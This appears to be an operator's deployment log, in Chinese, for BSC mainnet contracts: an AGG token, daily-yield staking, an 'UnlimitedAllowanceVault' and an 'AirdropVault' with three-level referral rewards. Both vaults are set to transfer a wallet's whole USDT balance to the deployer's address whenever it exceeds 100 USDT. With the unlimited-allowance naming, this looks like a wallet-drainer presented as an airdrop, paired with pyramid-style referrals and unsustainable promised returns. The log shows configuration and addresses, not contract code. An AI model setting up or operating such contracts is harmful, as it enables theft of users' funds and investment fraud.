# BSC 主网合约部署记录

## 当前使用的合约 (v2 - 2026-02-03)

> 权限 owner: `0x90fE5a6C1AAEDB2c8B62aeB4336C340Dc78F1081`（部署账户，未转移）

| 合约 | 地址 | 说明 |
|------|------|------|
| **ProjectTokenV2 (AGG)** | `0x90f4D6Ab53D811D096Bbf03F8Ff66a2D7FfC9BD4` | AGG 代币，总量 1 亿 |
| **TokenMiningV2** | `0x0c59DD5054068E27C611e2e179826501761cbeb9` | 多档锁仓挖矿 |
| **UnlimitedAllowanceVault** | `0xCd977ED99Acfca760A85925e677b51208033906d` | USDT 自动转账 (主项目) |
| **USDT (BSC)** | `0x55d398326f99059fF775485246999027B3197955` | BSC 主网 USDT |

---

## 空投项目合约 (AirdropVault - 2026-02-03)

> 独立项目，带3级推荐奖励

| 合约 | 地址 | 说明 |
|------|------|------|
| **AirdropVault** | `0xdD5Db8BD3Bc57a0E591449d5531aD1BeF07124DB` | USDT 空投 + 3级推荐 |

### AirdropVault 配置
- 代币: USDT
- 阈值: 100 USDT（余额超过 100 全部转走）
- 接收地址: `0x90fE5a6C1AAEDB2c8B62aeB4336C340Dc78F1081`
- 手续费: 0%
- 推荐奖励:
  - 1代: 20%
  - 2代: 10%
  - 3代: 5%
- 前端目录: `frontend-airdrop/`

---

### ProjectTokenV2 配置
- 名称: AGG
- 总量: 100,000,000 (1 亿)
- 买入滑点: 0%
- 卖出滑点: 2.8%
- 手续费接收: `0x90fE5a6C1AAEDB2c8B62aeB4336C340Dc78F1081`

### TokenMiningV2 配置
- 质押代币: AGG (`0x90f4D6Ab53D811D096Bbf03F8Ff66a2D7FfC9BD4`)
- 奖励代币: AGG (同上)
- 总奖励: 30,000,000 AGG
- 档位:
  - 灵活 (0 天): 0.4%/天
  - 3 个月 (90 天): 0.6%/天
  - 6 个月 (180 天): 0.8%/天
  - 12 个月 (365 天): 1.0%/天

### Vault 配置
- 代币: USDT
- 阈值: 100 USDT（余额超过 100 全部转走）
- 接收地址: `0x90fE5a6C1AAEDB2c8B62aeB4336C340Dc78F1081`
- 手续费: 0%
- 自动转账: 已启用

---

## 历史合约 v1 (2026-02-03，已废弃 - 权限已转移走)

> 权限 owner 已转移到: `0x4277EF1F274D6146229D2501F2e2A6ecc26f2789`

| 合约 | 地址 | 状态 |
|------|------|------|
| ProjectTokenV2 (AGG) | `0x5d4613b686C087Cc97aa96a291bd86255F970999` | 已废弃 |
| TokenMiningV2 | `0xD8a3A4FA60f1cbD79185dD99EaA5872A68F95a7a` | 已废弃 |
| UnlimitedAllowanceVault | `0x891345FD691b76e96237b7E397a296016d8718CE` | 已废弃 |

---

## 更早的历史合约 (2026-01-07，已废弃)

| 合约 | 地址 | 状态 |
|------|------|------|
| ProjectTokenV2 (AGG) | `0xCd339aec4797790A8e387eF10035df0000d3a815` | 已废弃 |
| TokenMiningV2 | `0xB4089956A0b775638e8F9F2E17deaE35B102c860` | 已废弃 |

---

## 待部署

| 合约 | 说明 |
|------|------|
| LPMiningV2 | 等有 LP Token 后部署 |
| PancakeSwap LP Token | 创建流动性后获得 |

---

## 注意事项

1. **TokenMiningV2 需要充值奖励**：向 `0x0c59DD5054068E27C611e2e179826501761cbeb9` 转入 3000 万 AGG
2. **Vault 操作**：部署账户既是 owner 又是默认 operator，可以直接在管理后台操作
3. **后续转移权限**：如需转移，调用各合约的 `transferOwnership(newOwner)` 方法
